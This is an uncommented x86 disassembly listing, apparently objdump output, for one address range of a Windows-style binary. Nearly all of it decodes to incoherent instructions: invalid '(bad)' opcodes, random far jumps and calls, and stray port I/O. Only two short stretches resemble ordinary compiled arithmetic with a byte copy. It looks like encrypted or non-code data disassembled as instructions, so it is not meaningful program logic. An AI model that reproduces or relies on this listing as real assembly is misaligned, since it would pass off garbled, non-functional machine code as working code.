  40d8b5:	mov    ds:0xd14c057c,al
  40d8ba:	or     BYTE PTR [edx],dh
  40d8bc:	lods   al,BYTE PTR ds:[esi]
  40d8bd:	arpl   WORD PTR [eax],ax
  40d8bf:	or     BYTE PTR [edi+0x7f],0x15
  40d8c3:	jb     0x40d85c
  40d8c5:	mov    DWORD PTR [edx-0x65783c95],edx
  40d8cb:	cld    
  40d8cc:	call   0x848185d7
  40d8d1:	ret    
  40d8d2:	xor    eax,0x6dac129e
  40d8d7:	mov    dh,0x5e
  40d8d9:	adc    DWORD PTR [ebx],0xffffffc0
  40d8dc:	cmp    edx,ebx
  40d8de:	adc    DWORD PTR [ecx],ebp
  40d8e0:	sub    ebx,DWORD PTR [edx-0x15]
  40d8e3:	ds scas eax,DWORD PTR es:[edi]
  40d8e5:	fnstenv [eax+0x1d]
  40d8e8:	psubb  mm2,QWORD PTR [edi-0x166edbff]
  40d8ef:	or     eax,0x44d2e2cf
  40d8f4:	adc    ebp,DWORD PTR [edx]
  40d8f6:	int3   
  40d8f7:	ret    
  40d8f8:	or     ebx,edi
  40d8fa:	aam    0xbb
  40d8fc:	jge    0x40d88c
  40d8fe:	sar    DWORD PTR [esi],cl
  40d900:	les    ebx,FWORD PTR [ecx+ecx*1]
  40d903:	mov    ecx,0xe58122b7
  40d908:	sbb    BYTE PTR [ebp-0x65],cl
  40d90b:	ret    0x5c7f
  40d90e:	add    eax,0xbfaede35
  40d913:	add    DWORD PTR [ebx],ecx
  40d915:	pop    ebx
  40d916:	retf   0xdb92
  40d919:	or     al,0x63
  40d91b:	sbb    DWORD PTR [esi+0x59],ebp
  40d91e:	retf   
  40d91f:	mov    ds:0x9468b3ee,al
  40d924:	call   0xf6a7:0xbcd4ef9
  40d92b:	adc    bh,0x96
  40d92e:	jno    0x40d99c
  40d930:	fistp  DWORD PTR [eax+0x1c]
  40d933:	stc    
  40d934:	mov    cl,0x8d
  40d936:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d937:	fcmovu st,st(5)
  40d939:	pop    ebp
  40d93a:	not    BYTE PTR [esp+ebp*2]
  40d93d:	les    ecx,FWORD PTR [eax+0x14]
  40d940:	xor    DWORD PTR [eax+0x76],edi
  40d943:	sahf   
  40d944:	xchg   ecx,eax
  40d945:	and    eax,0x9d2a5705
  40d94a:	xor    eax,0x146f62c0
  40d94f:	in     al,dx
  40d950:	xchg   edi,eax
  40d951:	fcmovbe st,st(7)
  40d953:	mov    ecx,0xd0a06d16
  40d958:	es sti 
  40d95a:	and    eax,0xd28ba602
  40d95f:	or     DWORD PTR [ecx-0x4b],0xffffffe2
  40d963:	pop    edx
  40d964:	ret    0xdb6b
  40d967:	push   es
  40d968:	mov    ebx,0x9db92581
  40d96d:	mov    dh,0xc
  40d96f:	add    DWORD PTR [ebp+0x58],esi
  40d972:	imul   esi,DWORD PTR [ebx*8-0x35dcadd4],0x3
  40d97a:	ficomp WORD PTR [ecx]
  40d97c:	cmp    eax,0x88159380
  40d981:	dec    ebp
  40d982:	(bad)  
  40d983:	jns    0x40d958
  40d985:	scas   al,BYTE PTR es:[edi]
  40d986:	xchg   ebx,eax
  40d987:	lock fnstsw WORD PTR [esi]
  40d98a:	enter  0x676f,0x7c
  40d98e:	fdivrp st(3),st
  40d990:	add    bh,bh
  40d992:	mov    WORD PTR [eax],cs
  40d994:	sub    eax,0xc7fdd618
  40d999:	xor    bl,BYTE PTR [eax-0x6a1c3f58]
  40d99f:	outs   dx,DWORD PTR ds:[esi]
  40d9a0:	and    dl,BYTE PTR [ebx]
  40d9a2:	push   edx
  40d9a3:	mov    al,0x41
  40d9a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d9a6:	(bad)  
  40d9a8:	leave  
  40d9a9:	(bad)  
  40d9aa:	pop    esp
  40d9ab:	xor    al,0xf1
  40d9ad:	cmp    eax,0x36961ff1
  40d9b2:	add    DWORD PTR [eax-0x3a4c05bb],0x3a
  40d9b9:	add    BYTE PTR [ebx-0x7c8932ff],0x69
  40d9c0:	push   ebp
  40d9c1:	call   0x4acc:0x92a9e716
  40d9c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d9c9:	loop   0x40d9ce
  40d9cb:	jb     0x40d9d1
  40d9cd:	cmp    DWORD PTR [edi-0x59],esp
  40d9d0:	pop    edi
  40d9d1:	iret   
  40d9d2:	(bad)  
  40d9d3:	push   eax
  40d9d4:	test   eax,0x84bcbb30
  40d9d9:	mov    dh,0xe0
  40d9db:	adc    al,0x9c
  40d9dd:	shr    BYTE PTR [esi+0x65],0x87
  40d9e1:	push   dx
  40d9e3:	fistp  QWORD PTR [esi-0x158d92a3]
  40d9e9:	mov    dh,0x7
  40d9eb:	cmp    esp,DWORD PTR [eax+0x564e34c2]
  40d9f1:	outs   dx,DWORD PTR ds:[esi]
  40d9f2:	pop    ss
  40d9f3:	sub    eax,0xb3fa852b
  40d9f8:	daa    
  40d9f9:	test   eax,esi
  40d9fb:	adc    bl,BYTE PTR ds:0x1db593ef
  40da01:	rol    DWORD PTR [esi-0x26],cl
  40da04:	sub    BYTE PTR [ebx+0x7f],ch
  40da07:	imul   esi,DWORD PTR [ecx+0x216e298e],0xf03c0a6a
  40da11:	shl    DWORD PTR [edi-0x78],0xa6
  40da15:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40da16:	or     dh,BYTE PTR [ecx]
  40da18:	pop    ds
  40da19:	mov    eax,0x388aeb57
  40da1e:	push   esi
  40da1f:	push   0x63
  40da21:	outs   dx,DWORD PTR ds:[esi]
  40da22:	or     BYTE PTR [edi+edx*8-0x2fdd2e0b],0x36
  40da2a:	dec    eax
  40da2b:	pop    eax
  40da2c:	push   edi
  40da2d:	and    eax,0x3e6c9a4a
  40da32:	in     eax,0x3f
  40da34:	jle    0x40da51
  40da36:	popa   
  40da37:	call   0x85183356
  40da3c:	fnsave [ecx]
  40da3e:	or     ch,BYTE PTR [ebx+eiz*4]
  40da41:	cmp    BYTE PTR [ebx+0x3b],0x3
  40da45:	mov    ds:0xbb691bd8,al
  40da4a:	ins    DWORD PTR es:[edi],dx
  40da4b:	mov    al,0x26
  40da4d:	in     al,dx
  40da4e:	data16 mov ch,0xf1
  40da51:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40da52:	push   edx
  40da53:	(bad)  
  40da54:	adc    DWORD PTR [ecx],ebx
  40da56:	jmp    0x2c37:0x170fcb12
  40da5d:	sbb    eax,esi
  40da5f:	push   ds
  40da60:	fwait
  40da61:	xor    DWORD PTR [ecx],ebx
  40da63:	clc    
  40da64:	mov    al,ds:0x63df0c3c
  40da69:	jmp    0x40dac8
  40da6b:	sub    dl,ah
  40da6d:	xchg   DWORD PTR [ebx],ecx
  40da6f:	add    al,BYTE PTR [edi-0x18]
  40da72:	icebp  
  40da73:	xchg   ch,dl
  40da75:	sar    DWORD PTR [eax-0x130419f7],0x7
  40da7c:	mov    WORD PTR ds:[ecx],fs
  40da7f:	pop    ebx
  40da80:	out    dx,eax
  40da81:	or     DWORD PTR [eax],ebp
  40da83:	retf   
  40da84:	cs or  ch,dl
  40da87:	jae    0x40da2f
  40da89:	push   edx
  40da8a:	xchg   ebp,eax
  40da8b:	and    bl,BYTE PTR [ebp-0xe]
  40da8e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40da8f:	inc    ebp
  40da90:	inc    edx
  40da91:	xor    edx,edi
  40da93:	adc    esi,DWORD PTR [edx+edi*1]
  40da96:	xlat   BYTE PTR ds:[ebx]
  40da97:	leave  
  40da98:	jno    0x40da61
  40da9a:	or     al,0x87
  40da9c:	ins    BYTE PTR es:[edi],dx
  40da9d:	in     al,dx
  40da9e:	mov    WORD PTR [edi+eiz*8],ss
  40daa1:	les    esp,FWORD PTR [esi-0x5bd20de3]
  40daa7:	ss dec ebx
  40daa9:	mov    eax,0xaa5e6715
  40daae:	mov    ds:0xa54b6450,eax
  40dab3:	mov    ebp,0x6a5319a6
  40dab8:	bound  ecx,QWORD PTR [edi-0x10]
  40dabb:	pushf  
  40dabc:	xchg   edi,eax
  40dabd:	in     al,dx
  40dabe:	adc    cl,dl
  40dac0:	imul   DWORD PTR [eax]
  40dac2:	mov    esi,0xd78f1eca
  40dac7:	xchg   esi,eax
  40dac8:	push   edx
  40dac9:	in     al,0x4b
  40dacb:	iret   
  40dacc:	pop    edi
  40dacd:	dec    ecx
  40dace:	jl     0x40dae2
  40dad0:	adc    al,0x65
  40dad2:	jle    0x40dab5
  40dad4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dad5:	inc    esi
  40dad6:	jmp    0x1aff:0x54b345a
  40dadd:	or     BYTE PTR [edi],ch
  40dadf:	add    BYTE PTR [ebx-0x4c21e798],dh
  40dae5:	dec    esp
  40dae6:	xchg   ecx,eax
  40dae7:	add    al,0xa2
  40dae9:	pop    ecx
  40daea:	and    DWORD PTR [edx],ecx
  40daec:	scas   eax,DWORD PTR es:[edi]
  40daed:	repz loop 0x40db59
  40daf0:	sbb    bh,dh
  40daf2:	cmp    esp,ecx
  40daf4:	inc    esp
  40daf5:	adc    eax,0xc3b613f6
  40dafa:	adc    DWORD PTR [ecx+0x2],ebp
  40dafd:	lahf   
  40dafe:	push   edx
  40daff:	adc    eax,0xfa082baa
  40db04:	ins    DWORD PTR es:[edi],dx
  40db05:	and    bh,BYTE PTR [ebx]
  40db07:	into   
  40db08:	xor    edi,DWORD PTR [edx+0x21]
  40db0b:	(bad)  
  40db0d:	outs   dx,DWORD PTR ds:[esi]
  40db0e:	cmp    dh,bh
  40db10:	add    cl,dh
  40db12:	mov    ?,ebp
  40db14:	inc    ax
  40db16:	pop    es
  40db17:	mov    eax,ds:0xa93faa86
  40db1c:	popa   
  40db1d:	lds    ebp,FWORD PTR [edi+0x70819eca]
  40db23:	ror    esp,1
  40db25:	jge    0x40db22
  40db27:	mov    esi,0x325574c0
  40db2c:	jmp    0xa159b1ed
  40db31:	dec    ebp
  40db32:	sti    
  40db33:	inc    ebp
  40db34:	xchg   esi,eax
  40db35:	cli    
  40db36:	ret    
  40db37:	ficomp DWORD PTR [ebx]
  40db39:	test   DWORD PTR [edi+0x63fe9185],0xb329f2c7
  40db43:	push   eax
  40db44:	mov    eax,DWORD PTR [ebp+0x8]
  40db47:	imul   ecx,ecx,0x2e01
  40db4d:	mov    esi,DWORD PTR [ebp-0x4]
  40db50:	add    eax,edi
  40db52:	div    esi
  40db54:	mov    edx,DWORD PTR [ebp-0x8]
  40db57:	mov    esi,0x940a7
  40db5c:	sub    ecx,0x16bea86
  40db62:	sub    eax,edx
  40db64:	xor    edx,edx
  40db66:	div    esi
  40db68:	mov    esi,0xdbd
  40db6d:	add    eax,esi
  40db6f:	cmp    ecx,eax
  40db71:	jae    0x40e47e
  40db77:	mov    DWORD PTR [ebp-0x1c],0x2d7e
  40db7e:	mov    DWORD PTR [ebp-0x20],0x383e
  40db85:	jmp    0x40de49
  40db8a:	test   DWORD PTR [ebx-0x21],edi
  40db8d:	in     eax,0xdf
  40db8f:	gs jnp 0x40dbed
  40db92:	les    ebp,FWORD PTR [edi+0x61]
  40db95:	jo     0x40db28
  40db97:	pusha  
  40db98:	jne    0x40dc16
  40db9a:	pop    ebx
  40db9b:	rcr    BYTE PTR [eax],cl
  40db9d:	sbb    dl,dl
  40db9f:	adc    al,0x18
  40dba1:	sbb    BYTE PTR [esi+0x4ade7f3a],bl
  40dba7:	cwde   
  40dba8:	add    dl,bh
  40dbaa:	ins    DWORD PTR es:[edi],dx
  40dbab:	fstp   TBYTE PTR [ebx-0x61]
  40dbae:	cmp    DWORD PTR [esi],eax
  40dbb0:	inc    ebp
  40dbb1:	cdq    
  40dbb2:	pop    ebp
  40dbb3:	cmc    
  40dbb4:	cmp    eax,DWORD PTR [edi]
  40dbb6:	jo     0x40dbbf
  40dbb8:	jg     0x40dc13
  40dbba:	pop    es
  40dbbb:	(bad)  
  40dbbc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dbbd:	xchg   esp,eax
  40dbbe:	out    0x6b,eax
  40dbc0:	pop    eax
  40dbc1:	jmp    0x41b11ace
  40dbc6:	clc    
  40dbc7:	lods   eax,DWORD PTR ds:[esi]
  40dbc8:	add    BYTE PTR [eax-0x72ebf617],cl
  40dbce:	iret   
  40dbcf:	xchg   DWORD PTR [edx],edx
  40dbd1:	pop    ds
  40dbd2:	xchg   ecx,eax
  40dbd3:	dec    ebp
  40dbd4:	enter  0xb628,0xfd
  40dbd8:	popa   
  40dbd9:	sahf   
  40dbda:	pop    esi
  40dbdb:	jmp    0x40dc52
  40dbdd:	ret    0x6e8c
  40dbe0:	jb     0x40dc44
  40dbe2:	retf   0xf792
  40dbe5:	daa    
  40dbe6:	cmp    eax,0x73e58bf6
  40dbeb:	dec    ebx
  40dbec:	cmp    al,BYTE PTR [ebx-0x12258c2f]
  40dbf2:	push   esp
  40dbf3:	call   0x2a1d3aa3
  40dbf8:	fcmovnbe st,st(0)
  40dbfa:	cld    
  40dbfb:	popf   
  40dbfc:	sti    
  40dbfd:	ins    DWORD PTR es:[edi],dx
  40dbfe:	pop    ecx
  40dbff:	push   ss
  40dc00:	push   esi
  40dc01:	loopne 0x40dc12
  40dc03:	loope  0x40dc73
  40dc05:	pop    ds
  40dc06:	fmul   DWORD PTR [edi]
  40dc08:	mov    ecx,0xf63d9354
  40dc0d:	in     al,dx
  40dc0e:	sbb    al,0x53
  40dc10:	mov    ds:0x8d109a10,al
  40dc15:	push   0x13
  40dc17:	jns    0x40dbf1
  40dc19:	jns    0x40dbc3
  40dc1b:	retf   0x8d5a
  40dc1e:	mov    bh,0x80
  40dc20:	int3   
  40dc21:	repnz dec ebx
  40dc23:	mov    bl,0xe2
  40dc25:	pop    esp
  40dc26:	mov    ebx,0xa68e6a38
  40dc2b:	push   0xa9a24b03
  40dc30:	scas   eax,DWORD PTR es:[edi]
  40dc31:	mov    ds:0x97f3a907,al
  40dc36:	mov    esi,0x4391a612
  40dc3b:	lock pop ecx
  40dc3d:	xchg   BYTE PTR [ebx+eiz*2-0x1d],dl
  40dc41:	mov    al,0xc9
  40dc43:	adc    eax,0xff6406f0
  40dc48:	sub    al,0xa9
  40dc4a:	jo     0x40dc15
  40dc4c:	jl     0x40dbe6
  40dc4e:	mov    al,0x74
  40dc50:	jno    0x40dcac
  40dc52:	in     eax,dx
  40dc53:	push   ds
  40dc54:	push   ebp
  40dc55:	imul   edi,edi,0x12c745c0
  40dc5b:	das    
  40dc5c:	add    eax,DWORD PTR [eax-0x2260f5f4]
  40dc62:	push   ss
  40dc63:	dec    edi
  40dc64:	mov    esp,DWORD PTR [ebp-0x4]
  40dc67:	mul    al
  40dc69:	test   ebx,ebp
  40dc6b:	mov    BYTE PTR [ebx+0xffa7380],bl
  40dc71:	nop
  40dc72:	aad    0x4a
  40dc74:	pop    es
  40dc75:	mov    edi,0x2c0de529
  40dc7a:	push   cs
  40dc7b:	add    eax,0x2ee9c69f
  40dc80:	xchg   esi,eax
  40dc81:	test   edi,ebp
  40dc83:	rcr    DWORD PTR [edi-0x10ae58b1],cl
  40dc89:	push   DWORD PTR [edi-0x5a]
  40dc8c:	cli    
  40dc8d:	stos   DWORD PTR es:[edi],eax
  40dc8e:	lods   eax,DWORD PTR ds:[esi]
  40dc8f:	rcr    DWORD PTR [edi+0x26],1
  40dc92:	call   0xc3f9:0xddd95b7a
  40dc99:	jae    0x40dd07
  40dc9b:	add    ch,dh
  40dc9d:	and    ah,BYTE PTR [edx+0x3d4820a6]
  40dca3:	pop    ebx
  40dca4:	cli    
  40dca5:	(bad)  
  40dca6:	outs   dx,DWORD PTR ds:[esi]
  40dca7:	push   eax
  40dca8:	push   ebx
  40dca9:	enter  0x2676,0xd5
  40dcad:	hlt    
  40dcae:	pop    esi
  40dcaf:	sbb    ch,0x4e
  40dcb2:	int3   
  40dcb3:	je     0x40dc7d
  40dcb5:	dec    ebx
  40dcb6:	inc    ebx
  40dcb7:	mov    al,ds:0xfaa4fcc
  40dcbc:	and    DWORD PTR [ecx+0x51],ebp
  40dcbf:	lods   al,BYTE PTR ds:[esi]
  40dcc0:	mov    dl,0x2f
  40dcc2:	cmp    eax,0xc17959a
  40dcc7:	mov    DWORD PTR [esi+0xc],ebx
  40dcca:	stos   BYTE PTR es:[edi],al
  40dccb:	mov    al,0x97
  40dccd:	(bad)  
  40dcce:	sub    BYTE PTR [edi+0x74],al
  40dcd1:	nop
  40dcd2:	imul   edx,DWORD PTR [ebx+0x7c],0x8cf714bd
  40dcd9:	adc    eax,0xfb7433dc
  40dcde:	xchg   DWORD PTR [ebx],eax
  40dce0:	pop    edi
  40dce1:	jae    0x40dce6
  40dce3:	adc    BYTE PTR [edx],bh
  40dce5:	jp     0x40dc7a
  40dce7:	pop    ebp
  40dce8:	inc    ebx
  40dce9:	inc    ecx
  40dcea:	hlt    
  40dceb:	jp     0x40dd0d
  40dced:	mov    edi,0xee26150e
  40dcf2:	xchg   esi,eax
  40dcf3:	sub    DWORD PTR [edi+0x68d40cf4],0xddf5d36
  40dcfd:	and    eax,0xb4190db4
  40dd02:	scas   al,BYTE PTR es:[edi]
  40dd03:	scas   eax,DWORD PTR es:[edi]
  40dd04:	js     0x40dd4e
  40dd06:	fist   DWORD PTR [eax-0x7e]
  40dd09:	jo     0x40dd4e
  40dd0b:	and    esp,esp
  40dd0d:	jg     0x40dcf7
  40dd0f:	daa    
  40dd10:	adc    DWORD PTR [ebx-0x52b6d370],0x5ecaf21
  40dd1a:	and    DWORD PTR [ebp+0x4a17eeaa],ebp
  40dd20:	push   edi
  40dd21:	cmp    BYTE PTR [edx],dl
  40dd23:	add    esp,DWORD PTR [edx-0x1cec7cf9]
  40dd29:	push   edi
  40dd2a:	pop    esi
  40dd2b:	frstor [eax-0x72]
  40dd2e:	imul   ebx,DWORD PTR [edi-0x36b1c2a0],0x43e2a559
  40dd38:	in     eax,0xad
  40dd3a:	pop    ss
  40dd3b:	sub    dh,BYTE PTR [esi-0x1f9366fa]
  40dd41:	pop    edi
  40dd42:	shl    BYTE PTR [ebx+eiz*8+0x12],0xc
  40dd47:	xchg   edi,eax
  40dd48:	test   esp,0xa3a26744
  40dd4e:	xor    DWORD PTR [edi+0x583e8f82],0xffffff9c
  40dd55:	dec    edi
  40dd56:	lods   al,BYTE PTR ds:[esi]
  40dd57:	daa    
  40dd58:	leave  
  40dd59:	inc    edi
  40dd5a:	je     0x40ddd4
  40dd5c:	push   es
  40dd5d:	cmp    edi,eax
  40dd5f:	xchg   BYTE PTR [esi],ah
  40dd61:	and    ebx,DWORD PTR ds:0x899accd9
  40dd67:	shl    DWORD PTR [eax+edx*2+0x4043bea3],1
  40dd6e:	or     DWORD PTR [edx-0x577d90a0],0xcb5d5627
  40dd78:	push   ebx
  40dd79:	enter  0x6bf0,0x17
  40dd7d:	push   0x475017ea
  40dd82:	and    BYTE PTR [edi+0x17278ce5],ch
  40dd88:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dd89:	fsub   QWORD PTR [edx]
  40dd8b:	mov    edi,eax
  40dd8d:	mov    ebp,0x81ac5e9c
  40dd92:	mov    ss,esi
  40dd94:	ror    DWORD PTR [edi-0x1126b7a1],0x25
  40dd9b:	push   ss
  40dd9c:	cdq    
  40dd9d:	xchg   ecx,eax
  40dd9e:	retf   
  40dd9f:	push   cs
  40dda0:	jne    0x40dd66
  40dda2:	mov    esi,0x70a0a0d0
  40dda7:	cdq    
  40dda8:	adc    eax,0xa56be80
  40ddad:	in     eax,dx
  40ddae:	sub    eax,0xa3593c83
  40ddb3:	shl    bl,cl
  40ddb5:	mov    ecx,DWORD PTR [eax-0x21]
  40ddb8:	pop    es
  40ddb9:	jae    0x40dd7b
  40ddbb:	cmp    DWORD PTR [esi],ebx
  40ddbd:	xor    al,BYTE PTR [edi+0xb]
  40ddc0:	ins    DWORD PTR es:[edi],dx
  40ddc1:	lea    edi,[ebx]
  40ddc3:	ds push ecx
  40ddc5:	xchg   ebx,eax
  40ddc6:	lds    eax,FWORD PTR [ebp+0x1727b71]
  40ddcc:	pop    ss
  40ddcd:	pop    ss
  40ddce:	mov    al,ss:0x81434b68
  40ddd4:	xor    al,0xbf
  40ddd6:	mov    eax,0xfa93cdd0
  40dddb:	xor    al,0xed
  40dddd:	out    0x47,eax
  40dddf:	jnp    0x40dd8e
  40dde1:	jno    0x40dd78
  40dde3:	push   es
  40dde4:	inc    ebx
  40dde5:	cld    
  40dde6:	inc    ecx
  40dde7:	cmp    BYTE PTR [ecx+0x4d],al
  40ddea:	es push edi
  40ddec:	push   edx
  40dded:	jmp    FWORD PTR [ecx+0x15c5f5e6]
  40ddf3:	pop    ds
  40ddf4:	xchg   edx,eax
  40ddf5:	lods   eax,DWORD PTR ds:[esi]
  40ddf6:	adc    dh,BYTE PTR [ecx+0x6d]
  40ddf9:	xchg   esi,eax
  40ddfa:	je     0x40de03
  40ddfc:	push   ecx
  40ddfd:	dec    ebx
  40ddfe:	sbb    al,0x26
  40de00:	mov    eax,0x4df3e048
  40de05:	sbb    DWORD PTR fs:[ebp-0x1fec2dc0],edi
  40de0c:	cli    
  40de0d:	cdq    
  40de0e:	cdq    
  40de0f:	sub    DWORD PTR [edx-0x44],ebp
  40de12:	inc    ebx
  40de13:	inc    esp
  40de14:	jbe    0x40dddc
  40de16:	popf   
  40de17:	push   es
  40de18:	into   
  40de19:	pop    ecx
  40de1a:	mov    ds:0x7bae199a,eax
  40de1f:	iret   
  40de20:	pop    ds
  40de21:	popa   
  40de22:	dec    eax
  40de23:	iret   
  40de24:	les    edx,FWORD PTR [ebx+esi*4-0x304f2e3f]
  40de2b:	(bad)  
  40de2c:	stc    
  40de2d:	dec    ebx
  40de2e:	fs or  eax,0x9979d24
  40de34:	lds    esp,FWORD PTR [esp-0x1dfc33a1]
  40de3b:	cmp    eax,0xc4d9bbd1
  40de40:	jecxz  0x40ddee
  40de42:	add    BYTE PTR [ecx+0x61],dh
  40de45:	pushf  
  40de46:	cmp    eax,0x45c7b73c
  40de4b:	fdivr  QWORD PTR [edx]
  40de4d:	cmp    al,BYTE PTR [eax]
  40de4f:	add    bh,al
  40de51:	inc    ebp
  40de52:	in     al,dx
  40de53:	int    0x13
  40de55:	add    BYTE PTR [eax],al
  40de57:	xor    edx,edx
  40de59:	mov    DWORD PTR [ebp-0x18],0x187
  40de60:	mov    DWORD PTR [ebp-0x28],0x3224
  40de67:	mov    eax,DWORD PTR [ebp-0x28]
  40de6a:	push   0x6
  40de6c:	pop    ebx
  40de6d:	div    ebx
  40de6f:	mov    edx,eax
  40de71:	mov    eax,ds:0x4225a8
  40de76:	mov    eax,DWORD PTR [eax+0x1d0]
  40de7c:	sub    eax,edx
  40de7e:	mov    edx,DWORD PTR [ebp-0x24]
  40de81:	mov    ebx,DWORD PTR [ebp-0x20]
  40de84:	imul   edx,ebx
  40de87:	mov    ebx,DWORD PTR [ebp-0x1c]
  40de8a:	xor    edx,ebx
  40de8c:	sub    edx,0x26bd
  40de92:	add    eax,ecx
  40de94:	and    edx,0x7126
  40de9a:	mov    ebx,ecx
  40de9c:	sub    ebx,edx
  40de9e:	mov    edx,DWORD PTR [ebp-0x18]
  40dea1:	sub    eax,edx
  40dea3:	mov    edx,DWORD PTR [ebp-0x14]
  40dea6:	sub    eax,edx
  40dea8:	mov    edx,DWORD PTR [ebp+0xc]
  40deab:	mov    dl,BYTE PTR [ebx+edx*1+0x16c0]
  40deb2:	mov    BYTE PTR [eax-0xbb5],dl
  40deb8:	jmp    0x40e17c
  40debd:	rep stos BYTE PTR es:[edi],al
  40debf:	add    bl,BYTE PTR [ecx]
  40dec1:	mov    ebx,0x23aae2a0
  40dec6:	inc    ebp
  40dec7:	leave  
  40dec8:	jl     0x40dee8
  40deca:	cdq    
  40decb:	pop    ecx
  40decc:	stos   BYTE PTR es:[edi],al
  40decd:	adc    al,0xcc
  40decf:	sbb    BYTE PTR [eax],bl
  40ded1:	rcl    BYTE PTR [eax+ebx*1],cl
  40ded4:	sbb    BYTE PTR [ecx-0x22],ch
  40ded7:	or     esp,DWORD PTR [edi]
  40ded9:	jge    0x40df52
  40dedb:	jl     0x40dedf
  40dedd:	(bad)  
  40dede:	loope  0x40dee0
  40dee0:	lea    edi,[eax+0x15]
  40dee3:	icebp  
  40dee4:	loop   0x40dec2
  40dee6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dee7:	xor    al,0xb5
  40dee9:	(bad)  
  40deea:	jmp    0x40de99
  40deec:	hlt    
  40deed:	cmp    al,0xef
  40deef:	mov    ds:0xb4e3aa2,eax
  40def4:	push   cs
  40def5:	lea    ecx,[edi+0x37b821a8]
  40defb:	pop    ebx
  40defc:	inc    ebx
  40defd:	js     0x40def2
  40deff:	dec    esi
  40df00:	imul   esp,eax,0xffffffd9
  40df03:	pop    edx
  40df04:	adc    BYTE PTR [edx],bl
  40df06:	fist   WORD PTR [ebx+ebp*2]
  40df09:	scas   eax,DWORD PTR es:[edi]
  40df0a:	and    eax,DWORD PTR [eax-0x28]
  40df0d:	addr16 inc edi
  40df0f:	sub    DWORD PTR [edi+edx*4],ebx
  40df12:	int3   
  40df13:	or     ebp,DWORD PTR [edx]
  40df15:	outs   dx,DWORD PTR ds:[esi]
  40df16:	pop    esi
  40df18:	fnstenv [edi-0x6bc68736]
  40df1e:	pop    edx
  40df1f:	cld    
  40df20:	and    ah,BYTE PTR [eax]
  40df22:	adc    BYTE PTR [ebp+ebx*2-0x67],0xf4
  40df27:	mov    ch,0x8f
  40df29:	dec    edi
  40df2a:	cmc    
  40df2b:	push   0xc25e5a37
  40df30:	shl    DWORD PTR [edx],cl
  40df32:	pop    es
  40df33:	mov    ch,cl
  40df35:	call   DWORD PTR [ecx]
  40df37:	xor    DWORD PTR [ebx+0x4d],edi
  40df3a:	add    eax,0x5dc079e3
  40df3f:	push   esp
  40df40:	ins    BYTE PTR es:[edi],dx
  40df41:	std    
  40df42:	push   edx
  40df43:	dec    ebx
  40df44:	inc    esp
  40df45:	out    dx,eax
  40df46:	pop    esp
  40df47:	aaa    
  40df48:	push   DWORD PTR [edx]
  40df4a:	repnz cld 
  40df4c:	sbb    ch,dh
  40df4e:	dec    edx
  40df4f:	scas   al,BYTE PTR es:[edi]
  40df50:	jmp    0x40df09
  40df52:	popf   
  40df53:	mov    dl,0xd6
  40df55:	jecxz  0x40dee0
  40df57:	fild   WORD PTR [ecx]
  40df59:	sbb    BYTE PTR [edx],dh
  40df5b:	shl    BYTE PTR [edx],1
  40df5d:	fidiv  WORD PTR [esp+ecx*4+0x3b]
  40df61:	fadd   st,st(1)
  40df63:	mov    ah,0xb9
  40df65:	mov    eax,0xcab4e5f9
  40df6a:	jp     0x40dfc6
  40df6c:	aaa    
  40df6d:	xor    DWORD PTR [edx-0x18485d43],0xea168a12
  40df77:	ds pop es
  40df79:	and    eax,0x74e27819
  40df7e:	lds    esp,FWORD PTR [esi]
  40df80:	pusha  
  40df81:	iret   
  40df82:	loopne 0x40df8b
  40df84:	and    eax,0x71629663
  40df89:	inc    ecx
  40df8a:	mov    al,ds:0xdbc61fcf
  40df8f:	cmc    
  40df90:	pop    es
  40df91:	xchg   BYTE PTR [eax+0x3432199f],dh
  40df97:	xor    ch,BYTE PTR [ecx]
  40df99:	in     eax,0xf1
  40df9b:	clc    
  40df9c:	sti    
  40df9d:	in     al,0x1d
  40df9f:	(bad)  
  40dfa0:	test   eax,0x17126b26
  40dfa5:	and    eax,0xbd858ee
  40dfaa:	mov    eax,ds:0x248e825d
  40dfaf:	icebp  
  40dfb0:	retf   0xf97
  40dfb3:	lahf   
  40dfb4:	(bad)  [edi-0x27]
  40dfb7:	repnz lahf 
  40dfb9:	lods   al,BYTE PTR ds:[esi]
  40dfba:	repnz push 0x32
  40dfbd:	stc    
  40dfbe:	into   
  40dfbf:	aaa    
  40dfc0:	xchg   BYTE PTR [edi+esi*4],bl
  40dfc3:	pop    eax
  40dfc4:	mov    BYTE PTR [ebx],dl
  40dfc6:	aas    
  40dfc7:	and    BYTE PTR [edx-0x40],al
  40dfca:	push   eax
  40dfcb:	hlt    
  40dfcc:	cmc    
  40dfcd:	mov    eax,ds:0x8b7da596
  40dfd2:	and    ecx,esp
  40dfd4:	scas   al,BYTE PTR es:[edi]
  40dfd5:	das    
  40dfd6:	(bad)  
  40dfd7:	jp     0x40df84
  40dfd9:	adc    eax,0xebd0ce03
  40dfde:	sar    ah,0xa8
  40dfe1:	sub    DWORD PTR [esi-0x75],ecx
  40dfe4:	imul   esp,DWORD PTR [edx-0x3f4c721c],0xdde8b8bb
  40dfee:	sub    edx,ebx
  40dff0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dff1:	jnp    0x40dfd0
  40dff3:	loopne 0x40dfec
  40dff5:	pop    ebx
  40dff6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dff7:	enter  0x7cd5,0x6f
  40dffb:	loopne 0x40dfdb
  40dffd:	adc    al,0x20
  40dfff:	lds    esi,FWORD PTR [ecx]
  40e001:	inc    ebp
  40e002:	dec    ecx
  40e003:	inc    edx
  40e004:	fisub  DWORD PTR [ebp+eiz*1+0x7f69319b]
  40e00b:	out    0x81,al
  40e00d:	sub    ah,cl
  40e00f:	test   DWORD PTR [edx],0xb92b48f4
  40e015:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e016:	into   
  40e017:	mov    ds:0x7b90e658,al
  40e01c:	sbb    BYTE PTR [edx-0x5],dh
  40e01f:	test   BYTE PTR [edi+0x47],0x7a
  40e023:	(bad)  
  40e026:	jbe    0x40e00e
